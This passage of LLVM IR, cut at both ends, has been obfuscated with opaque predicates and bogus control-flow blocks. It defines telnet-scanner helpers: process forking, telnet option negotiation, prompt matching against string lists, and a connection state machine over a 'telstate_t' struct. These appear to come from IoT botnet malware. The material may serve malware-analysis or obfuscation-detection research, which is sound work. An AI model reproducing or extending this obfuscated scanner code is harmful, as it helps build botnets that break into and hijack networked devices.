  br label %180

; <label>:154:                                    ; preds = %originalBBpart28
  br label %155

; <label>:155:                                    ; preds = %154, %37
  %156 = load i32, i32* @x.43
  %157 = load i32, i32* @y.44
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  %164 = load i32, i32* %6, align 4
  %165 = call i32 (i32, i32, ...) @fcntl(i32 %164, i32 3, i8* null)
  %166 = sext i32 %165 to i64
  store i64 %166, i64* %15, align 8
  %167 = load i64, i64* %15, align 8
  %168 = and i64 %167, -2049
  store i64 %168, i64* %15, align 8
  %169 = load i32, i32* %6, align 4
  %170 = load i64, i64* %15, align 8
  %171 = call i32 (i32, i32, ...) @fcntl(i32 %169, i32 4, i64 %170)
  store i32 1, i32* %5, align 4
  %172 = load i32, i32* @x.43
  %173 = load i32, i32* @y.44
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br label %180

; <label>:180:                                    ; preds = %originalBBpart218, %originalBBpart212, %originalBBpart24, %85, %36
  %181 = load i32, i32* %5, align 4
  ret i32 %181

originalBBalteredBB:                              ; preds = %originalBB, %86
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %103
  store i32 0, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %137
  store i32 0, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  %182 = load i32, i32* %6, align 4
  %183 = call i32 (i32, i32, ...) @fcntl(i32 %182, i32 3, i8* null)
  %184 = sext i32 %183 to i64
  store i64 %184, i64* %15, align 8
  %185 = load i64, i64* %15, align 8
  %_ = shl i64 %185, -2049
  %_15 = shl i64 %185, -2049
  %_16 = shl i64 %185, -2049
  %186 = and i64 %185, -2049
  store i64 %186, i64* %15, align 8
  %187 = load i32, i32* %6, align 4
  %188 = load i64, i64* %15, align 8
  %189 = call i32 (i32, i32, ...) @fcntl(i32 %187, i32 4, i64 %188)
  store i32 1, i32* %5, align 4
  br label %originalBB14
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %79

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #3
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %66, %10
  %19 = load i32, i32* @x.45
  %20 = load i32, i32* @y.46
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %4, align 4
  %28 = zext i32 %27 to i64
  %29 = load i64, i64* @numpids, align 8
  %30 = sub i64 %29, 1
  %31 = icmp ult i64 %28, %30
  %32 = load i32, i32* @x.45
  %33 = load i32, i32* @y.46
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %31, label %40, label %69

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.45
  %42 = load i32, i32* @y.46
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %40
  %49 = load i32*, i32** @pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = zext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = load i32*, i32** %3, align 8
  %55 = load i32, i32* %4, align 4
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  store i32 %53, i32* %57, align 4
  %58 = load i32, i32* @x.45
  %59 = load i32, i32* @y.46
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %66

; <label>:66:                                     ; preds = %originalBBpart212
  %67 = load i32, i32* %4, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %4, align 4
  br label %18

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #3
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %8
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %18
  %81 = load i32, i32* %4, align 4
  %82 = zext i32 %81 to i64
  %83 = load i64, i64* @numpids, align 8
  %_ = sub i64 %83, 1
  %gen = mul i64 %_, 1
  %_1 = sub i64 0, %83
  %gen2 = add i64 %_1, 1
  %_3 = shl i64 %83, 1
  %_4 = shl i64 %83, 1
  %_5 = shl i64 %83, 1
  %_6 = sub i64 0, %83
  %gen7 = add i64 %_6, 1
  %_8 = sub i64 %83, 1
  %gen9 = mul i64 %_8, 1
  %84 = sub i64 %83, 1
  %85 = icmp ult i64 %82, %84
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %40
  %86 = load i32*, i32** @pids, align 8
  %87 = load i32, i32* %4, align 4
  %88 = zext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  %90 = load i32, i32* %89, align 4
  %91 = load i32*, i32** %3, align 8
  %92 = load i32, i32* %4, align 4
  %93 = zext i32 %92 to i64
  %94 = getelementptr inbounds i32, i32* %91, i64 %93
  store i32 %90, i32* %94, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* @x.49
  %40 = load i32, i32* @y.50
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = load i32, i32* %6, align 4
  %48 = load i32, i32* @x.49
  %49 = load i32, i32* @y.50
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %38
  %56 = load i32, i32* %6, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.51
  %6 = load i32, i32* @y.52
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #3, !srcloc !4
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %76

; <label>:59:                                     ; preds = %43
  %60 = load i32, i32* @x.51
  %61 = load i32, i32* @y.52
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 0, i32* %13, align 4
  %68 = load i32, i32* @x.51
  %69 = load i32, i32* @y.52
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:76:                                     ; preds = %43
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %originalBBpart24
  %84 = load i32, i32* %13, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  %88 = alloca i8*, align 8
  %89 = alloca i32, align 4
  %90 = alloca %struct.fd_set, align 8
  %91 = alloca %struct.timeval, align 8
  %92 = alloca i32, align 4
  %93 = alloca i32, align 4
  store i32 %0, i32* %86, align 4
  store i32 %1, i32* %87, align 4
  store i8* %2, i8** %88, align 8
  store i32 %3, i32* %89, align 4
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 0
  store i64 0, i64* %94, align 8
  %95 = load i32, i32* %87, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 0, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.53
  %5 = load i32, i32* @y.54
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.53
  %22 = load i32, i32* @y.54
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %93 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %95

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  store i8 -1, i8* %16, align 1
  %31 = load i32, i32* %13, align 4
  %32 = call i64 @send(i32 %31, i8* %16, i64 1, i32 16384)
  %33 = load i8*, i8** %14, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %55

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @x.53
  %40 = load i32, i32* @y.54
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  store i8 -2, i8* %16, align 1
  %47 = load i32, i32* @x.53
  %48 = load i32, i32* @y.54
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:55:                                     ; preds = %30
  %56 = load i8*, i8** %14, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 1
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 254, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %55
  store i8 -4, i8* %16, align 1
  br label %85

; <label>:62:                                     ; preds = %55
  %63 = load i8*, i8** %14, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 3, %66
  br i1 %67, label %68, label %76

; <label>:68:                                     ; preds = %62
  %69 = load i8*, i8** %14, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %16, align 1
  br label %84

; <label>:76:                                     ; preds = %62
  %77 = load i8*, i8** %14, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %16, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %68
  br label %85

; <label>:85:                                     ; preds = %84, %61
  br label %86

; <label>:86:                                     ; preds = %85, %originalBBpart24
  %87 = load i32, i32* %13, align 4
  %88 = call i64 @send(i32 %87, i8* %16, i64 1, i32 16384)
  %89 = load i32, i32* %13, align 4
  %90 = load i8*, i8** %14, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  %92 = call i64 @send(i32 %89, i8* %91, i64 1, i32 16384)
  br label %94

; <label>:93:                                     ; preds = %originalBBpart2
  br label %94

; <label>:94:                                     ; preds = %93, %86
  store i32 0, i32* %12, align 4
  br label %95

; <label>:95:                                     ; preds = %94, %29
  %96 = load i32, i32* %12, align 4
  ret i32 %96

originalBBalteredBB:                              ; preds = %originalBB, %3
  %97 = alloca i32, align 4
  %98 = alloca i32, align 4
  %99 = alloca i8*, align 8
  %100 = alloca i32, align 4
  %101 = alloca i8, align 1
  store i32 %0, i32* %98, align 4
  store i8* %1, i8** %99, align 8
  store i32 %2, i32* %100, align 4
  %102 = load i8*, i8** %99, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  store i8 -2, i8* %16, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %originalBBpart214, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %68

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %48

; <label>:31:                                     ; preds = %22
  %32 = load i32, i32* @x.55
  %33 = load i32, i32* @y.56
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  store i32 1, i32* %3, align 4
  %40 = load i32, i32* @x.55
  %41 = load i32, i32* @y.56
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:48:                                     ; preds = %22
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* @x.55
  %51 = load i32, i32* @y.56
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* %7, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %7, align 4
  %60 = load i32, i32* @x.55
  %61 = load i32, i32* @y.56
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br label %18

; <label>:68:                                     ; preds = %18
  %69 = load i32, i32* @x.55
  %70 = load i32, i32* @y.56
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %68
  store i32 0, i32* %3, align 4
  %77 = load i32, i32* @x.55
  %78 = load i32, i32* @y.56
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %85

; <label>:85:                                     ; preds = %originalBBpart218, %originalBBpart2
  %86 = load i32, i32* %3, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %31
  store i32 1, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %87 = load i32, i32* %7, align 4
  %_ = sub i32 %87, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 0, %87
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 0, %87
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %87, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %87, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %87, 1
  %_11 = sub i32 %87, 1
  %gen12 = mul i32 %_11, 1
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %7, align 4
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %68
  store i32 0, i32* %3, align 4
  br label %originalBB16
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.57
  %16 = load i32, i32* @y.58
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %44

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.57
  %25 = load i32, i32* @y.58
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 @close(i32 %34)
  %36 = load i32, i32* @x.57
  %37 = load i32, i32* @y.58
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
